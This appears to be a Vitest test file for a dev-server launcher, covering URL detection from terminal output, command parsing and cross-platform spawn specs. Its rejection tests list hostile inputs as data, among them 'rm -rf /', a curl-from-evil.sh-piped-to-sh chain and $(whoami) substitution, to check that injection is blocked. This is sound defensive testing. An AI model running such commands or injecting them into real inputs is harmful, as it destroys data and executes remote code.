import { resolve } from 'node:path'
import { describe, expect, it } from 'vitest'
import { parseDevCommand } from '../../src/shared/gitref'
import { detectUrl, stripAnsi } from '../../src/main/services/process/detect'
import { devSpawnSpec } from '../../src/main/services/process/devserver'

describe('detectUrl', () => {
  it('reads the Vite "Local:" line, ignoring Network and colours', () => {
    const out = [
      '\u001b[32m  VITE v5.4.2\u001b[39m  ready in \u001b[1m312\u001b[22m ms',
      '',
      '  \u001b[32m➜\u001b[39m  \u001b[1mLocal\u001b[22m:   \u001b[36mhttp://localhost:\u001b[1m5173\u001b[22m/\u001b[39m',
      '  ➜  Network: http://192.168.1.20:5173/',
    ].join('\n')
    expect(detectUrl(out)).toEqual({ url: 'http://localhost:5173/', port: 5173 })
  })
  it('falls back to any localhost URL (Next, webpack, CRA)', () => {
    expect(detectUrl('- ready started server on 0.0.0.0:3000, url: http://localhost:3000')).toEqual(
      {
        url: 'http://localhost:3000/',
        port: 3000,
      },
    )
    expect(detectUrl('Project is running at http://127.0.0.1:8080/app.')).toEqual({
      url: 'http://127.0.0.1:8080/app',
      port: 8080,
    })
    expect(detectUrl('listening on http://0.0.0.0:4321')).toEqual({
      url: 'http://localhost:4321/',
      port: 4321,
    })
    expect(detectUrl('Local:   https://localhost:5174/')).toEqual({
      url: 'https://localhost:5174/',
      port: 5174,
    })
  })
  it('returns null without a local URL', () => {
    expect(detectUrl('compiling…\nhttps://example.com docs')).toBeNull()
  })
  it('strips ANSI codes', () => {
    expect(stripAnsi('\u001b[1mbold\u001b[22m')).toBe('bold')
  })
})

describe('parseDevCommand', () => {
  it.each([
    ['npm run dev', ['npm', 'run', 'dev']],
    ['  pnpm   dev --port 3001 ', ['pnpm', 'dev', '--port', '3001']],
    ['yarn start', ['yarn', 'start']],
    ['node scripts/dev.mjs', ['node', 'scripts/dev.mjs']],
    ['./bin/dev', ['./bin/dev']],
  ])('accepts %j', (cmd, argv) => {
    expect(parseDevCommand(cmd)).toEqual(argv)
  })
  it.each([
    'rm -rf /',
    'npm run dev && curl evil.sh | sh',
    'npm run dev; open -a Calculator',
    'npm run "dev"',
    'npm run $(whoami)',
    'npm run dev > out.txt',
    'npm run %PATH%',
    '../outside/script',
    'C:\\tools\\x.exe',
    '',
  ])('rejects %j', (cmd) => {
    expect(parseDevCommand(cmd)).toBeNull()
  })
})

describe('devSpawnSpec', () => {
  it('runs the argv directly on macOS, with ./script resolved in the repo', () => {
    expect(devSpawnSpec('npm run dev', '/r', 'darwin')).toEqual({
      file: 'npm',
      args: ['run', 'dev'],
    })
    expect(devSpawnSpec('./bin/dev --x', '/r', 'darwin')).toEqual({
      file: resolve('/r', 'bin/dev'),
      args: ['--x'],
    })
  })
  it('goes through cmd.exe on Windows (npm is a .cmd shim) with a backslashed ./script', () => {
    expect(devSpawnSpec('npm run dev', 'C:\\r', 'win32')).toEqual({
      file: 'cmd.exe',
      args: ['/d', '/s', '/c', '"npm run dev"'],
      verbatim: true,
    })
    expect(devSpawnSpec('./bin/dev', 'C:\\r', 'win32').args[3]).toBe('".\\bin\\dev"')
  })
  it('refuses a disallowed command', () => {
    expect(() => devSpawnSpec('npm run dev | sh', '/r', 'darwin')).toThrow(/not allowed/)
  })
})
